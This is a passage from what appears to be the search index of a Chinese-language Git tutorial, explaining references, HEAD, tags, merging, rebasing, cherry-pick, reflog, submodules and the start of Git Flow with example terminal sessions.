object\uff0c\u5e76\u628a\u6587\u4ef6\u540d\u548cblob\u7684sha1\u7b49\u5176\u4ed6\u4fe1\u606f\u66f4\u65b0\u5230\u6682\u5b58\u533a\u7684index\u6587\u4ef6\u4e2d\uff1b\u5f53\u6211\u4eec\u901a\u8fc7<code>git commit -m</code>\u65f6\uff0cgit\u4f1a\u6839\u636eindex\u4fe1\u606f\u751f\u6210\u4e00\u4e2atree object\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a\u65b0\u7684commit object\u5173\u8054\u5230\u8fd9\u4e2atree\u3002commit object\u7684parent\u6307\u5411\u4e86\u4e0a\u4e00\u4e2acommit\uff0c\u5f53\u524d\u5206\u652f\u7684\u6307\u9488\u4e5f\u4f1a\u79fb\u52a8\u5230\u65b0\u7684commit\u7ed3\u70b9\u3002</p>"},{"location":"other/git/#tag","title":"tag","text":"<p>git\u4e2d\u8fd8\u6709\u4e00\u79cd\u5bf9\u8c61\u7c7b\u578b\u5c31\u662ftag\uff0c\u5b83\u901a\u5e38\u548ccommit\u5dee\u4e0d\u591a\u3002\u89c1\u4e0b\u6587\u6807\u7b7e\u5f15\u7528\u3002</p>"},{"location":"other/git/#_4","title":"\u5f15\u7528","text":"<p>\u5f15\u7528\u672c\u8d28\u4e0a\u5c31\u662f\u6307\u5411\u67d0\u4e2acommit\u7684\u6307\u9488\uff0c\u5b83\u88ab\u653e\u5728<code>.gits/refs</code>\u76ee\u5f55\u4e2d\u3002 <pre><code>\u279c  testgit git:(master) tree .git/refs/\n.git/refs/\n\u251c\u2500\u2500 heads\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 master\n\u2514\u2500\u2500 tags\n\n2 directories, 1 file\n\u279c  testgit git:(master) cat .git/refs/heads/master\n79380b0625150b1b71940cfac0b2a501793eac0c\n</code></pre> \u5176\u53ef\u4ee5\u7528\u4f2a\u7801\u6765\u8868\u793a: <pre><code>references = map&lt;string, string&gt;\ndef update_ref(name, id):\n    references[name] = id\ndef read_ref(name):\n    return references[name]\ndef load_ref(name_or_id):\n    if name_or_id in references: # \u8bf4\u660e\u662fname\n        return load(references[name_or_id])\n    else:   # \u8bf4\u660e\u662fid\n        return load(name_or_id)\n</code></pre></p>"},{"location":"other/git/#_5","title":"\u5206\u652f\u5f15\u7528","text":"<p>\u5f53\u6211\u4eec\u65b0\u5efa\u4e00\u4e2a\u5206\u652f\u65f6\uff0c\u5c31\u4f1a\u5728<code>.git/refs/heads</code>\u6587\u4ef6\u5939\u4e0b\u591a\u4e00\u4e2a\u540d\u79f0\u4e3a\u5206\u652f\u540d\u79f0\u7684\u6587\u4ef6\uff0c\u5185\u5bb9\u5c31\u662f\u4e00\u4e2acommit\u7684sha\u3002\u5f53\u6211\u4eec\u63d0\u4ea4\u4e00\u6b21commit\u65f6\uff0c\u5f53\u524d\u5206\u652f\u7684\u5f15\u7528\u7684commit\u5c31\u4f1a\u81ea\u52a8\u53d1\u751f\u6539\u53d8\u3002 <pre><code>\u279c  testgit git:(6c27f42) git branch testbranch\n\u279c  testgit git:(testbranch) cat .git/refs/heads/testbranch\n6c27f425aae198e6c1e5098c13d352b3f27edfca\n</code></pre></p>"},{"location":"other/git/#head","title":"HEAD\u5f15\u7528","text":"<p>\u5b83\u662f\u4e00\u4e2a\u7b26\u53f7\u5f15\u7528\uff0c\u6307\u5411\u5f53\u524d\u6240\u5728\u7684\u5206\u652f\u3002\u5b83\u4f4d\u4e8e<code>.git/HEAD</code>\u6587\u4ef6\u3002 <pre><code>\u279c  testgit git:(master) cat .git/HEAD\nref: refs/heads/master\n\u279c  testgit git:(master) git checkout 6c27\nNote: checking out '6c27'.\nYou are in 'detached HEAD' state.\n\u279c  testgit git:(6c27f42) cat .git/HEAD\n6c27f425aae198e6c1e5098c13d352b3f27edfca\n</code></pre> \u5f53\u6211\u4eeccheckout\u67d0\u4e2acommit\u65f6\uff0cHEAD\u4f1a\u6307\u5411commit\uff0c\u8fd9\u65f6\u5019\u79f0\u4e3a\u5206\u79bb\u5934\u6307\u9488(Detached HEAD)\u72b6\u6001\u3002</p>"},{"location":"other/git/#_6","title":"\u6807\u7b7e\u5f15\u7528","text":"<p>\u6211\u4eec\u901a\u5e38\u521b\u5efa\u7684\u90fd\u662f\u8f7b\u91cf\u7ea7\u6807\u7b7e\uff0c\u5b83\u53ea\u662f\u4e00\u4e2a\u5f15\u7528\uff0c\u4f4d\u4e8e<code>.gits/refs/tags</code>\u6587\u4ef6\u5939\u4e0b\u3002\u4f46\u8fd8\u53ef\u4ee5\u521b\u5efa\u53e6\u4e00\u79cd\u9644\u6ce8\u6807\u7b7e\uff0c\u5b83\u4f1a\u989d\u5916\u521b\u5efa\u4e00\u4e2atag object\u3002 <pre><code>\u279c  testgit git:(testbranch) git tag testmytag\n\u279c  testgit git:(testbranch) cat .git/refs/tags/testmytag\n6c27f425aae198e6c1e5098c13d352b3f27edfca\n\u279c  testgit git:(testbranch) git tag -a v1.0 -m \"test my tag\"\n\u279c  testgit git:(testbranch) cat .git/refs/tags/v1.0\n0ee17848727b21f3086760c6bbc38cc9a12b5e08\n\u279c  testgit git:(testbranch) git cat-file -t 0ee1\ntag\n\u279c  testgit git:(testbranch) git cat-file -p 0ee1\nobject 6c27f425aae198e6c1e5098c13d352b3f27edfca\ntype commit\ntag v1.0\ntagger hjlarry &lt;hjlarry@163.com&gt; 1582267013 +0800\n\ntest my tag\n</code></pre> \u6807\u7b7e\u548c\u5206\u652f\u7684\u4e3b\u8981\u533a\u522b\u662f:</p> <ul> <li>\u6807\u7b7e\u53ef\u4ee5\u6307\u5411\u4efb\u610fobject\uff0c\u800c\u5206\u652f\u53ea\u80fd\u6307\u5411commit object\u3002</li> <li>\u5206\u652f\u5728\u6bcf\u6b21\u63d0\u4ea4\u66f4\u65b0\u65f6\u4f1a\u81ea\u52a8\u66f4\u65b0\uff0c\u800c\u6807\u7b7e\u4e0d\u4f1a\u3002</li> </ul>"},{"location":"other/git/#_7","title":"\u8fdc\u7a0b\u5f15\u7528","text":"<p>\u5f53\u6211\u4eec\u6dfb\u52a0\u4e00\u4e2a\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u6216\u8005\u662f\u4ece\u8fdc\u7a0b\u5e93clone\u8fc7\u6765\u65f6\uff0c\u5c31\u4f1a\u6709\u8fdc\u7a0b\u5f15\u7528\uff0c\u5b83\u4f4d\u4e8e<code>.git/refs/remotes</code>\u6587\u4ef6\u5939\u4e0b\u3002 <pre><code>\u279c  testgit git:(testbranch) tree ~/my_git/.git/refs/remotes\n/home/hejl/my_git/.git/refs/remotes\n\u2514\u2500\u2500 origin\n    \u251c\u2500\u2500 HEAD\n    \u2514\u2500\u2500 master\n\n1 directory, 2 files\n\u279c  testgit git:(testbranch) cat ~/my_git/.git/refs/remotes/origin/HEAD\nref: refs/remotes/origin/master\n\u279c  testgit git:(testbranch) cat ~/my_git/.git/refs/remotes/origin/master\n94985c6535a5493d493ce89631c7e417f5e7ecaa\n</code></pre> \u8fdc\u7a0b\u5f15\u7528\u548c\u5206\u652f\u4e4b\u95f4\u6700\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e\u8fdc\u7a0b\u5f15\u7528\u662f\u53ea\u8bfb\u7684\u3002\u867d\u7136\u53ef\u4ee5checkout\u5230\u67d0\u4e2a\u8fdc\u7a0b\u5f15\u7528\uff0c\u4f46\u662fGit\u5e76\u4e0d\u4f1a\u5c06HEAD\u5f15\u7528\u6307\u5411\u8be5\u8fdc\u7a0b\u5f15\u7528\uff0c\u8fd9\u79cd\u60c5\u51b5\u4ecd\u7136\u662f\u5206\u79bb\u5934\u6307\u9488\u72b6\u6001\u3002 </p>"},{"location":"other/git/#_8","title":"\u5e38\u7528\u64cd\u4f5c","text":""},{"location":"other/git/#_9","title":"\u5408\u5e76","text":""},{"location":"other/git/#fast-forward","title":"FAST-FORWARD","text":"<p>\u5f53\u8bd5\u56fe\u5408\u5e76\u4e24\u4e2a\u5206\u652f\u65f6\uff0c\u5982\u679c\u987a\u7740\u4e00\u4e2a\u5206\u652f\u4e00\u8def\u8d70\u4e0b\u53bb\u80fd\u5230\u8fbe\u53e6\u4e00\u4e2a\u5206\u652f\uff0c\u90a3\u4e48Git\u7684\u5408\u5e76\u53ea\u662f\u628a\u6307\u9488\u5f80\u524d\u63a8\u8fdb\uff0c\u6240\u4ee5\u53eb\u5feb\u8fdb\u6a21\u5f0f(\u5373Fast-forward)\u3002 <pre><code>\u279c  testgit git:(master) \u2717 git checkout -b fixbug\nSwitched to a new branch 'fixbug'\n\u279c  testgit git:(fixbug) \u2717 echo '123' &gt; test.txt\n\u279c  testgit git:(fixbug) \u2717 git add .\n\u279c  testgit git:(fixbug) \u2717 git commit -m \"9th commit\"\n[fixbug 22a449d] 9th commit\n 1 file changed, 1 insertion(+)\n\u279c  testgit git:(fixbug) git checkout master\nSwitched to branch 'master'\n\u279c  testgit git:(master) git merge fixbug\nUpdating c658c0b..22a449d\nFast-forward\n test.txt | 1 +\n 1 file changed, 1 insertion(+)\n</code></pre> \u5408\u5e76\u65f6\uff0c\u4f1a\u63d0\u793aFast-forward\u3002</p> <p>\u53e6\u5916\uff0c\u6211\u4eec\u5f80\u5f80\u4f1a\u628a\u8fdc\u7a0b\u4ed3\u5e93\u7684\u66f4\u65b0<code>git pull</code>\u4e0b\u6765\uff0c\u8fd9\u80cc\u540e\u5b9e\u9645\u4e0a\u6267\u884c\u4e86\u4e24\u6761\u6307\u4ee4\uff0c\u5148<code>git fetch</code>\u518d<code>git merge</code>\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u4e5f\u5c5e\u4e8eFast-forward\u5408\u5e76\u3002</p>"},{"location":"other/git/#_10","title":"\u4e09\u65b9\u5408\u5e76","text":"<p>\u975eFAST-FORWARD\u60c5\u51b5\u65f6\uff0c\u5c31\u662f\u4e00\u6b21\u4e09\u65b9\u5408\u5e76\u3002\u4e09\u65b9\u6307\u7684\u662f\u5f53\u524d\u5206\u652f\u8282\u70b9\u3001\u8981\u5408\u5e76\u7684\u5206\u652f\u7684\u8282\u70b9\u4ee5\u53ca\u5b83\u4eec\u7684\u5171\u540c\u7956\u7236\u8282\u70b9\u3002\u8fd9\u79cd\u60c5\u51b5\u4f1a\u628a\u5b83\u4eec\u7684\u5185\u5bb9\u5408\u5e76\u8d77\u6765\uff0c\u5982\u679c\u6ca1\u6709\u51b2\u7a81\u7684\u8bdd\u4f1a\u81ea\u52a8\u5f62\u6210\u4e00\u4e2a\u65b0\u7684commit\u3002 <pre><code>\u279c  testgit git:(master) git checkout -b newfeature HEAD~2\nSwitched to a new branch 'newfeature'\n\u279c  testgit git:(newfeature) echo 'newfeature' &gt; newfeature.txt\n\u279c  testgit git:(newfeature) \u2717 git add .\n\u279c  testgit git:(newfeature) \u2717 git commit -m \"add new feature\"\n[newfeature 68212fe] add new feature\n 1 file changed, 1 insertion(+)\n create mode 100644 newfeature.txt\n\u279c  testgit git:(newfeature) git checkout master\nSwitched to branch 'master'\n\u279c  testgit git:(master) git merge newfeature\nMerge made by the 'recursive' strategy.\n newfeature.txt | 1 +\n 1 file changed, 1 insertion(+)\n create mode 100644 newfeature.txt\n</code></pre> \u901a\u8fc7<code>git log --graph</code>\u53ef\u4ee5\u89c2\u5bdf\u5230\u65e5\u5fd7: <pre><code>*   commit 979309d67d62bd2fb3beeb009c20f750d362e93a (HEAD -&gt; master)\n|\\  Merge: 22a449d 68212fe\n| | Author: hjlarry &lt;hjlarry@163.com&gt;\n| | Date:   Sun Feb 23 21:46:55 2020 +0800\n| |\n| |     Merge branch 'newfeature'\n| |\n| * commit 68212fef9f5e17091bcd14b4d9be713bfc2c763b (newfeature)\n| | Author: hjlarry &lt;hjlarry@163.com&gt;\n| | Date:   Sun Feb 23 21:46:34 2020 +0800\n| |\n| |     add new feature\n| |\n* | commit 22a449d52fe269ed7c969c179c1788f89013ac2d \n| | Author: hjlarry &lt;hjlarry@163.com&gt;\n| | Date:   Sun Feb 23 21:39:01 2020 +0800\n| |\n| |     9th commit\n| |\n* | commit c658c0b8070ec1ab7dfe53351b64da79ae939e6d\n|/  Author: hjlarry &lt;hjlarry@163.com&gt;\n|   Date:   Sun Feb 23 16:57:12 2020 +0800\n|\n|       8th commit\n</code></pre> \u6211\u4eec\u89c2\u5bdfmerge\u65f6\u7684\u90a3\u4e2acommit object\u4f1a\u53d1\u73b0\u5b83\u662f\u6709\u4e24\u4e2aparent\u7684: <pre><code>\u279c  testgit git:(master) git cat-file -p 9793\ntree 88cab0838dc7d8ae476592dbd60b4bda86dafbd8\nparent 22a449d52fe269ed7c969c179c1788f89013ac2d\nparent 68212fef9f5e17091bcd14b4d9be713bfc2c763b\nauthor hjlarry &lt;hjlarry@163.com&gt; 1582465615 +0800\ncommitter hjlarry &lt;hjlarry@163.com&gt; 1582465615 +0800\n\nMerge branch 'newfeature'\n</code></pre></p> <p>\u4e09\u65b9\u5408\u5e76\u65f6\uff0c\u4e5f\u7ecf\u5e38\u4f1a\u9047\u5230\u53d1\u751f\u51b2\u7a81\u7684\u60c5\u51b5\u3002\u8fd9\u65f6\u5019git\u4f1a\u6682\u505c\u5408\u5e76\uff0c\u7ed9\u51fa\u63d0\u793a\uff0c\u5e76\u5728\u51b2\u7a81\u7684\u5730\u65b9\u505a\u51fa\u6807\u8bb0\u3002\u6211\u4eec\u9700\u8981\u624b\u5de5\u5904\u7406\uff0c\u9009\u62e9\u67d0\u4e2a\u5206\u652f\u6216\u8005\u81ea\u884c\u518d\u505a\u4fee\u6539\u90fd\u53ef\u4ee5\uff0c\u7136\u540e\u518d\u81ea\u884c<code>git add</code>\u548c<code>git commit</code>\u5373\u53ef\u3002</p>"},{"location":"other/git/#_11","title":"\u53d8\u57fa","text":"<p>\u57fa\u4e8e\u4e4b\u524d\u4e09\u65b9\u5408\u5e76\u7684\u793a\u4f8b\uff0c\u8fd8\u6709\u4e00\u79cd\u5408\u5e76\u5206\u652f\u7684\u65b9\u6cd5\u5c31\u662f\u53d8\u57fa\u3002\u5b83\u4f1a\u5728\u5f53\u524d\u5206\u652f\u4e0a\u91cd\u6f14\u4e00\u904d\u76ee\u6807\u5206\u652f\u7684\u5386\u53f2\uff0c\u6700\u540e\u5f62\u6210\u4e00\u4e2a\u7ebf\u6027\u7684\u63d0\u4ea4\u5386\u53f2\u3002\u5f53\u524d\u5206\u652f\u7684commit object\u7531\u4e8e\u53d8\u66f4\u4e86\u5176parent\u5c31\u4f1a\u53d1\u751f\u6539\u53d8\uff0c\u800c\u76ee\u6807\u5206\u652f\u7684commit object\u5f80\u5f80\u4e0d\u4f1a\u6539\u53d8\u3002 <pre><code>\u279c  testgit git:(master) git checkout -b testrebase HEAD~\nSwitched to a new branch 'testrebase'\n\u279c  testgit git:(testrebase) echo 'testrebase'&gt;test.txt\n\u279c  testgit git:(testrebase) \u2717 git add .\n\u279c  testgit git:(testrebase) \u2717 git commit -m \"test rebase\"\n[testrebase 7f4088a] test rebase\n 1 file changed, 1 insertion(+), 3 deletions(-)\n\u279c  testgit git:(testrebase) git checkout master\nSwitched to branch 'master'\n\u279c  testgit git:(master) git log --graph\n\u279c  testgit git:(master) git rebase testrebase\nFirst, rewinding head to replay your work on top of it...\nApplying: add new feature\n</code></pre> \u4f9d\u7136\u89c2\u5bdf\u65e5\u5fd7: <pre><code>* commit cd2c246f0cfcd2d98717af0a405ac17fd23636bc (HEAD -&gt; master)\n| Author: hjlarry &lt;hjlarry@163.com&gt;\n| Date:   Sun Feb 23 21:46:34 2020 +0800\n|\n|     add new feature\n|\n* commit 7f4088a0254081c4349a253c2d3a74dd7a7f1234 (testrebase)\n| Author: hjlarry &lt;hjlarry@163.com&gt;\n| Date:   Sun Feb 23 22:47:17 2020 +0800\n|\n|     test rebase\n|\n* commit 22a449d52fe269ed7c969c179c1788f89013ac2d (fixbug)\n| Author: hjlarry &lt;hjlarry@163.com&gt;\n| Date:   Sun Feb 23 21:39:01 2020 +0800\n|\n|     9th commit\n|\n* commit c658c0b8070ec1ab7dfe53351b64da79ae939e6d\n| Author: hjlarry &lt;hjlarry@163.com&gt;\n| Date:   Sun Feb 23 16:57:12 2020 +0800\n|\n|     8th commit\n</code></pre></p> <p>\u5b83\u5178\u578b\u7684\u4f7f\u7528\u573a\u666f\uff0c\u4f8b\u5982\u56e2\u961f\u5176\u4ed6\u4eba\u7ef4\u62a4\u7684\u9879\u76ee\uff0c\u6211\u4eec\u5728\u81ea\u5df1\u7684\u5206\u652f\u4e0a\u4e3a\u5176\u63d0\u4f9bfeature\uff0c\u7136\u540e\u628a\u6211\u4eec\u7684\u5206\u652f\u53d8\u57fa\u5230origin/master\u4e0a\uff0c\u8fd9\u6837\u5176\u4ed6\u4eba\u53ea\u9700\u8981\u53bbFAST-FORWARD\u800c\u65e0\u9700\u4eba\u5de5\u6574\u5408\u3002</p>"},{"location":"other/git/#_12","title":"\u4ea4\u4e92\u5f0f\u53d8\u57fa","text":"<p>\u901a\u8fc7<code>git rebase -i &lt;commit_id&gt;</code>\u5c31\u80fd\u8fdb\u5165\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u754c\u9762: <pre><code>pick 2c70e0b second commit a\npick c351a72 third commit\n\n# Rebase 37b766f..c351a72 onto 37b766f (2 commands)\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n# d, drop = remove commit\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n</code></pre> \u5b83\u4f1a\u5217\u51fa\u8fd9\u4e2a<code>commit_id</code>(\u53ef\u4ee5\u7528commit\u7684hash\u6216\u8005<code>HEAD~3</code>\u8fd9\u6837\u7684\u5f62\u5f0f)\u7684child\u4e00\u76f4\u5230\u5f53\u524d\u5206\u652f\u7684\u6700\u540e\u4e00\u4e2acommit\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u4e2a\u754c\u9762\u4e2d\u7f16\u8f91\u60f3\u5bf9\u6bcf\u4e00\u4e2acommit\u505a\u7684\u64cd\u4f5c\uff1a</p> <ul> <li>p\uff0c\u5bf9\u8fd9\u6761commit\u4e0d\u505a\u4efb\u4f55\u53d8\u66f4</li> <li>r\uff0c\u4f7f\u7528\u8fd9\u6761commit\uff0c\u4f46\u4fee\u6539\u5b83\u7684commit message</li> <li>e\uff0c\u5148\u6682\u505crebase\uff0c\u628a\u8fd9\u6761commit\u4fee\u6539\u7f16\u8f91\u4ee5\u540e\u518d\u7ee7\u7eed\uff0c\u7ee7\u7eed\u65f6\u4f7f\u7528<code>git rebase --continue</code>\u5373\u53ef</li> <li>s\uff0c\u4f7f\u7528\u8fd9\u6761commit\uff0c\u4f46\u628a\u5b83\u5408\u5e76\u5165\u524d\u4e00\u6761commit</li> <li>f, \u548cs\u76f8\u540c\uff0c\u4f46\u4e22\u5f03\u6389\u5b83\u7684commit message</li> <li>x, \u5728rebase\u8fc7\u7a0b\u4e2d\u6267\u884c\u4e00\u4e9b\u547d\u4ee4\uff0c\u4f8b\u5982<code>npm test</code>\u4e4b\u7c7b\u786e\u4fdd\u4fee\u6539\u4e0d\u4f1a\u4ea7\u751f\u7834\u574f\u6027\u5185\u5bb9</li> <li>d, \u79fb\u9664\u8fd9\u6761commit</li> </ul> <p>\u6211\u4eec\u5728\u4e00\u4e9b\u573a\u666f\uff0c\u4f8b\u5982\u4fee\u6539\u8001\u65e7commit\u7684msg\u3001\u628a\u8fde\u7eed\u6216\u95f4\u9694\u7684\u591a\u4e2acommit\u6574\u7406\u4e3a1\u4e2a\u7b49\u4f7f\u7528\u4ea4\u4e92\u5f0f\u53d8\u57fa\u90fd\u4f1a\u6bd4\u8f83\u65b9\u4fbf\u3002</p> <p>\u8fd9\u79cd\u65b9\u5f0f\u770b\u8d77\u6765\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u6700\u7956\u5148\u7684\u90a3\u6761commit\uff0c\u5b9e\u9645\u4e0a\u6709\u8fd9\u79cd\u573a\u666f\u65f6\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u628a\u7956\u5148commit\u6dfb\u52a0\u5230\u5934\u90e8\u5373\u53ef\u3002\u5728\u4ea4\u4e92\u5f0f\u754c\u9762\u4e2d\u4e5f\u53ef\u4ee5\u624b\u52a8\u8c03\u6574commit\u7684\u987a\u5e8f\u3002\u6709\u4e9b\u64cd\u4f5c\u4f8b\u5982\u4fee\u6539commit msg\uff0c\u5c31\u4f1a\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684commit object\uff0c\u5f53\u7136\u4e5f\u4f1a\u5f71\u54cd\u5230\u5b83\u7684\u6240\u6709child object\uff0c\u56e0\u4e3asha\u503c\u53d8\u4e86\uff0c\u5c31\u5f97\u4e00\u5c42\u5c42\u7684\u4fee\u6539\u4e0b\u53bb\u3002</p>"},{"location":"other/git/#_13","title":"\u5e38\u7528\u547d\u4ee4","text":"\u547d\u4ee4 \u610f\u4e49 <code>git diff</code> \u6bd4\u8f83\u5de5\u4f5c\u533a\u548c\u6682\u5b58\u533a\u6240\u542b\u6587\u4ef6\u7684\u5dee\u5f02 <code>git diff HEAD</code> \u6bd4\u8f83\u5de5\u4f5c\u533a\u548cHEAD\u6240\u542b\u6587\u4ef6\u7684\u5dee\u5f02 <code>git diff --cached</code> \u6bd4\u8f83\u6682\u5b58\u533a\u548cHEAD\u6240\u542b\u6587\u4ef6\u7684\u5dee\u5f02 <code>git diff -- &lt;file&gt;</code> \u6bd4\u8f83\u5de5\u4f5c\u533a\u548cHEAD\u67d0\u4e2a\u6587\u4ef6\u7684\u5dee\u5f02 <code>git reset HEAD</code> \u6682\u5b58\u533a\u7684\u6240\u6709\u6587\u4ef6\u6062\u590d\u7684\u548cHEAD\u4e00\u6837 <code>git reset HEAD &lt;file&gt;</code> \u6682\u5b58\u533a\u67d0\u4e2a\u6587\u4ef6\u6062\u590d\u4e3aHEAD\u90a3\u4e2a\u6587\u4ef6 <code>git checkout -- &lt;file&gt;</code> \u5de5\u4f5c\u533a\u67d0\u4e2a\u6587\u4ef6\u6062\u590d\u4e3a\u6682\u5b58\u533a\u90a3\u4e2a\u6587\u4ef6 <code>git reset --hard &lt;commit&gt;</code> \u5de5\u4f5c\u533a\u6062\u590d\u4e3a\u8be5commit\uff0c\u56de\u6eda\u548c\u672a\u6765\u5747\u53ef <code>git stash</code> \u6682\u5b58\u5de5\u4f5c\u73b0\u573a <code>git stash apply</code> \u6062\u590d\u5de5\u4f5c\u73b0\u573a <code>git stash apply &lt;index&gt;</code> \u6062\u590d\u5230\u67d0\u4e2a\u5de5\u4f5c\u73b0\u573a <code>git branch -av</code> \u67e5\u770b\u6240\u6709\u672c\u5730\u548c\u8fdc\u7a0b\u7684\u5206\u652f\u53ca\u5176\u5bf9\u5e94\u7684commit <code>git checkout -b &lt;name&gt; &lt;commit&gt;</code> \u521b\u5efa\u4e00\u4e2a\u5206\u652f\u5e76\u5207\u6362\u8fc7\u53bb\uff0ccommit\u53ef\u7701\u7565 <code>git branch -f &lt;name&gt; &lt;commit&gt;</code> \u5f3a\u5236\u628a\u67d0\u4e2a\u5206\u652f\u79fb\u52a8\u5230commit\u5904\u53bb <code>git branch -u origin/A</code> \u5c06\u672c\u5730\u5f53\u524d\u5206\u652f\u548c\u8fdc\u7a0bA\u5206\u652f\u5173\u8054"},{"location":"other/git/#_14","title":"\u5176\u4ed6\u6280\u5de7","text":""},{"location":"other/git/#cherry-pick","title":"cherry-pick","text":"<p>cherry-pick\u7c7b\u4f3c\u4e8e\u4e00\u4e2a\u5b9a\u5236\u5316\u7684merge\uff0c\u5b83\u53ef\u4ee5\u628a\u5176\u5b83\u5206\u652f\u4e0a\u7684commit\u4e00\u4e2a\u4e2a\u6458\u4e0b\u6765\uff0c\u5408\u5e76\u5230\u5f53\u524d\u5206\u652f\u3002</p> <p>\u5b83\u7684\u4f7f\u7528\u65b9\u6cd5\u662f<code>git cherry-pick &lt;commid_id1&gt; &lt;commid_id2&gt; ...</code>\uff0c\u5c31\u4f1a\u628a\u6bcf\u4e2a\u6311\u9009\u7684commit\u63d0\u4ea4\u4e00\u6b21\u751f\u6210\u4e00\u4e2a\u65b0\u7684commit id\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>git cherry-pick -n &lt;commid_id1&gt; &lt;commid_id2&gt;</code>\u6311\u9009\u51fa\u76f8\u5e94\u7684commit\u81f3\u6682\u5b58\u533a\u800c\u4e0d\u63d0\u4ea4\uff0c\u540e\u7eed\u81ea\u5df1\u53ef\u4ee5\u518d\u624b\u52a8\u63d0\u4ea4\u3002</p>"},{"location":"other/git/#reflog","title":"reflog","text":"<p>\u5f15\u7528\u65e5\u5fd7\u8bb0\u5f55\u4e86\u7528\u6237\u5728\u672c\u5730\u66f4\u6539\u7684\u5b8c\u6574\u5386\u53f2\u8bb0\u5f55\uff0c\u901a\u8fc7<code>git reflog</code>\u53ef\u4ee5\u67e5\u770b\u5230\u7c7b\u4f3c\u8fd9\u6837\u7684\u4fe1\u606f <pre><code>e1b4a61 (HEAD) HEAD@{0}: revert: Revert \"8th commit\"\n979309d HEAD@{1}: checkout: moving from master to HEAD@{11}\nc658c0b (master) HEAD@{2}: reset: moving to c658\n5665150 HEAD@{3}: reset: moving to 5665\n...\n</code></pre> \u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f: <pre><code>HEAD@{0} \u64a4\u9500\u64cd\u4f5c: \u64a4\u9500\u7684\u6d88\u606f\nHEAD@{1} \u5207\u6362\u64cd\u4f5c: \u4ecemaster\u5207\u6362\u81f3HEAD@{11}\nHEAD@{2} \u91cd\u7f6e\u64cd\u4f5c: \u91cd\u7f6e\u81f3c658\nHEAD@{3} \u91cd\u7f6e\u64cd\u4f5c: \u91cd\u7f6e\u81f35665\n</code></pre> \u63a5\u7740\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528<code>git checkout HEAD@{1}</code>\u8fd9\u6837\u7684\u64cd\u4f5c\u6062\u590d\u5230\u5207\u6362\u64cd\u4f5c\u65f6\u7684\u573a\u666f\u3002</p>"},{"location":"other/git/#submodule","title":"submodule","text":"<p>\u4f7f\u7528\u573a\u666f\uff0c\u4f8b\u5982\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u6709\u4e00\u4e9b\u901a\u7528\u7684\u90e8\u5206\u5e0c\u671b\u62bd\u51fa\u4f5c\u4e3a\u4e00\u4e2a\u516c\u5171\u7684\u5e93\u6765\u7ef4\u62a4\uff0c\u6216\u8005hugo\u4e2d\u7684\u67d0\u4e9b\u76ae\u80a4\u4e5f\u4f7f\u7528\u4e86submodule\u3002</p> <p>\u5305\u542b\u5b50\u6a21\u5757\u7684\u9879\u76ee\uff0c\u5728clone\u4e3b\u9879\u76ee\u7684\u65f6\u5019\u9700\u8981\u5e26\u53c2\u6570<code>git clone &lt;url&gt; --recurse-submodules</code>\u6216\u8005\u4f7f\u7528<code>git submodule init &amp;&amp; git submodule update</code>\u3002</p> <p>\u5982\u679c\u5b50\u6a21\u5757\u7684\u5185\u5bb9\u6211\u4eec\u505a\u4e86\u53d8\u66f4\uff0c\u5728\u4e3b\u6a21\u5757\u4e2d\u4f7f\u7528<code>git add/commit</code>\u662f\u65e0\u6548\u7684\u3002\u5982\u679c\u5b50\u6a21\u5757\u7684\u8fdc\u7a0b\u4ed3\u5e93\u6709\u66f4\u65b0\uff0c\u6211\u4eec\u4e5f\u9700\u8981\u8fdb\u5165\u5b50\u6a21\u5757\u6587\u4ef6\u5939\u624d\u80fd\u83b7\u53d6\u5230\u66f4\u65b0\u3002</p>"},{"location":"other/git/#_15","title":"\u5de5\u4f5c\u6d41","text":"<p>\u5de5\u4f5c\u6d41(workflow)\u662f\u6307\u5728\u591a\u4eba\u534f\u4f5c\u7684\u65f6\u5019\uff0c\u56e2\u961f\u4ee5\u4ec0\u4e48\u6837\u7684\u5de5\u4f5c\u6d41\u7a0b\u6709\u6548\u7684\u5408\u4f5c\u3002</p>"},{"location":"other/git/#git-flow","title":"Git Flow","text":"<p>\u8be5\u5de5\u4f5c\u6d41\u4e3a\u9879\u76ee\u8bbe\u5b9a\u4e86\u4e24\u4e2a\u957f\u671f\u5206\u652f\uff0c\u5373\u4e3b\u5206\u652fmaster\u548c\u5f00\u53d1\u5206\u652fdevelop\u3002master\u5b58\u653e\u4e86\u5bf9\u5916\u53d1\u5e03\u7684\u7248\u672c\uff0c\u4efb\u4f55\u65f6\u5019\u5728\u8fd9\u4e2a\u4e0a\u9762\u62ff\u5230\u7684\u90fd\u662f\u7a33\u5b9a\u7684\u53d1\u5e03\u7248\u3002develop\u7528\u4e8e\u65e5\u5e38\u5f00\u53d1\uff0c\u5b58\u653e\u6700\u65b0\u7684\u5f00\u53d1\u7248\u672c\u3002</p> <p>\u5176\u6b21\uff0c\u9879\u76ee\u6839\u636e\u4e0d\u540c\u7684\u76ee\u7684\u8bbe\u5b9a\u4e86\u4e09\u4e2a\u77ed\u671f\u5206\u652f\uff0c\u5305\u62ec\u529f\u80fd\u5206\u652f(feature branch)\u3001\u8865\u4e01\u5206\u652f(hotfix branch)\u548c\u9884\u53d1\u5206\u652f(release 